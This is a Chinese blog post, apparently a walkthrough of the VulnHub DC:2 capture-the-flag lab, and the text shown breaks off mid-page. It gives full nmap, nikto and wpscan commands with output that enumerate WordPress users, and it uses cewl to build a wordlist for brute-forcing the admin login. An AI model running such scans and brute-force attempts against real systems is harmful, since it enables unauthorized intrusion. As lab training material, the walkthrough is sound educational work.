<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  DC:2 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  DC:2</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-28T07:34:48.159Z" id="date"> 2023-05-28</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-28T08:43:09.441Z" id="updated"> 2023-05-28</time></div></span><br><span>Word Count: <div class="control">5.1k</div></span><br><span>Read Time: <div class="control">29 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/blhx5th.jpg'><img src="/pic/blhx5th.jpg" alt="blhx5th"></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>DC系列第二台靶机。主要知识点是cewl的使用以及rbash的逃出方法。总体来说还是比较轻松有意思的。</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>部署完之后记得在攻击机上的<code>/etc/hosts</code>上加上一行<code>&lt;target-ip&gt;  dc-2</code>,<code>&lt;target-ip&gt;</code>是靶机的ip，这样在网页自动跳转时才不会出错。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机发现，端口扫描，TCP扫描，服务探测，OS识别，脚本漏扫</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ sudo nmap -sn 192.168.56.0/24                            <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 14:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00019s latency).<br>MAC Address: 0A:00:27:00:00:08 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.100<br>Host is up (0.00015s latency).<br>MAC Address: 08:00:27:2E:A1:5A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.110<br>Host is up (0.00075s latency).<br>MAC Address: 08:00:27:B4:BE:CB (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.09 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.110<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 14:17 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.110<br>Host is up (0.0016s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7744/tcp open  raqmon-pdu<br>MAC Address: 08:00:27:B4:BE:CB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.15 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ sudo nmap -sT -sV -sC -O -p80,7744 192.168.56.110<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 14:17 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.110<br>Host is up (0.00097s latency).<br><br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Did not follow redirect to http://dc-2/<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)<br>|   2048 5911d8af38518f41a744b32803809942 (RSA)<br>|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)<br>|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)<br>MAC Address: 08:00:27:B4:BE:CB (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.68 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ sudo nmap --script=vuln 192.168.56.110           <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 14:18 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.110<br>Host is up (0.00036s latency).<br>Not shown: 999 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /wp-login.php: Possible admin folder</span><br><span class="hljs-string">|   /readme.html: Wordpress version: 2 </span><br><span class="hljs-string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span><br><span class="hljs-string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span><br><span class="hljs-string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span><br><span class="hljs-string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span><br><span class="hljs-string">|   /wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|   /wp-admin/upgrade.php: Wordpress login page.</span><br><span class="hljs-string">|_  /readme.html: Interesting, a readme.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-wordpress-users: <br>| Username found: admin<br>| Username found: tom<br>| Username found: jerry<br>|_Search stopped at ID <span class="hljs-comment">#25. Increase the upper limit if necessary with &#x27;http-wordpress-users.limit&#x27;</span><br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">MAC Address: 08:00:27:B4:BE:CB (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 36.61 seconds</span><br><span class="hljs-string">                                                                                             </span><br><span class="hljs-string">┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]</span><br><span class="hljs-string">└─$ sudo nikto -h http://192.168.56.110    </span><br><span class="hljs-string">- Nikto v2.5.0</span><br><span class="hljs-string">---------------------------------------------------------------------------</span><br><span class="hljs-string">+ Target IP:          192.168.56.110</span><br><span class="hljs-string">+ Target Hostname:    192.168.56.110</span><br><span class="hljs-string">+ Target Port:        80</span><br><span class="hljs-string">+ Start Time:         2023-05-28 14:20:25 (GMT8)</span><br><span class="hljs-string">---------------------------------------------------------------------------</span><br><span class="hljs-string">+ Server: Apache/2.4.10 (Debian)</span><br><span class="hljs-string">+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="hljs-string">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="hljs-string">+ Root page / redirects to: http://dc-2/</span><br><span class="hljs-string">+ /index.php?: Drupal Link header found with value: ARRAY(0x563ec3ea0920). See: https://www.drupal.org/</span><br><span class="hljs-string">+ No CGI Directories found (use &#x27;</span>-C all<span class="hljs-string">&#x27; to force check all possible dirs)</span><br><span class="hljs-string">+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="hljs-string">+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.</span><br><span class="hljs-string">+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/</span><br><span class="hljs-string">+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin &#x27;</span>Tested up to<span class="hljs-string">&#x27; version usually matches the WordPress version.</span><br><span class="hljs-string">+ /wp-links-opml.php: This WordPress script reveals the installed version.</span><br><span class="hljs-string">+ /license.txt: License file found may identify site software.</span><br><span class="hljs-string">+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span><br><span class="hljs-string">+ /wp-login.php: Wordpress login found.</span><br><span class="hljs-string">+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="hljs-string">+ End Time:           2023-05-28 14:21:56 (GMT8) (91 seconds)</span><br><span class="hljs-string">---------------------------------------------------------------------------</span><br><span class="hljs-string">+ 1 host(s) tested</span><br></code></pre></td></tr></table></figure>

<p>我们获取到的主要信息是ssh服务开在7744端口上，且脚本漏扫扫出来的目录结构显示网站明显就是基于wordpress搭建。</p>
<p>那wordpress是老熟人了，直接对症下药，用wpscan扫一扫呗。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ sudo wpscan --url http://dc-2 -e   <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://dc-2/ [192.168.56.110]</span><br><span class="hljs-string">[+] Started: Sun May 28 14:28:40 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://dc-2/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="hljs-string"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentyseventeen</span><br><span class="hljs-string"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="hljs-string"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 3.2</span><br><span class="hljs-string"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="hljs-string"> | Style Name: Twenty Seventeen</span><br><span class="hljs-string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="hljs-string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.2 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;</span>Version: 1.2<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:00 &lt;==================&gt; (500 / 500) 100.00% Time: 00:00:00</span><br><span class="hljs-string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No themes Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:03 &lt;================&gt; (2575 / 2575) 100.00% Time: 00:00:03</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Timthumbs Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:00 &lt;===================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking DB Exports - Time: 00:00:00 &lt;=========================&gt; (71 / 71) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No DB Exports Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span><br><span class="hljs-string"> Brute Forcing Attachment IDs - Time: 00:00:07 &lt;==============&gt; (100 / 100) 100.00% Time: 00:00:07</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Medias Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Brute Forcing Author IDs - Time: 00:00:01 &lt;====================&gt; (10 / 10) 100.00% Time: 00:00:01</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] User(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] admin</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Wp Json Api (Aggressive Detection)</span><br><span class="hljs-string"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] jerry</span><br><span class="hljs-string"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="hljs-string"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] tom</span><br><span class="hljs-string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Sun May 28 14:29:03 2023</span><br><span class="hljs-string">[+] Requests Done: 3444</span><br><span class="hljs-string">[+] Cached Requests: 9</span><br><span class="hljs-string">[+] Data Sent: 884.313 KB</span><br><span class="hljs-string">[+] Data Received: 1.063 MB</span><br><span class="hljs-string">[+] Memory used: 285.43 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:23</span><br></code></pre></td></tr></table></figure>

<p>可以发现扫描出来了三个用户: <code>admin</code>,<code>jerry</code>,<code>tom</code>。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>在尝试登录wp后台前，我们先看看网页到底长啥样。</p>
<p class='item-img' data-src='/pic/assets/flag1.png'><img src="/pic/assets/flag1.png" alt="flag1"></p>
<p>随便点点我们就找到了flag1。</p>
<p>flag1提示我们常规wordlist很可能不会起作用，告诉我们最好用<code>cewl</code>。</p>
<p><code>cewl</code>是基于ruby写的字典生成工具。既然他都这么说了，那我们就用用呗。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ cewl http://dc-2 -w dc-2.txt                             <br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br>                                                                                       <br>┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ <span class="hljs-built_in">cat</span> dc-2.txt                <br>sit<br>amet<br>nec<br>quis<br>vel<br>orci<br>site<br>non<br>sed<br>vitae<br>luctus<br>........(太长了省略了)<br></code></pre></td></tr></table></figure>

<p>生成了个238词的字典，我们拿它爆破一下admin账号的登录。如果能成功就最好了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 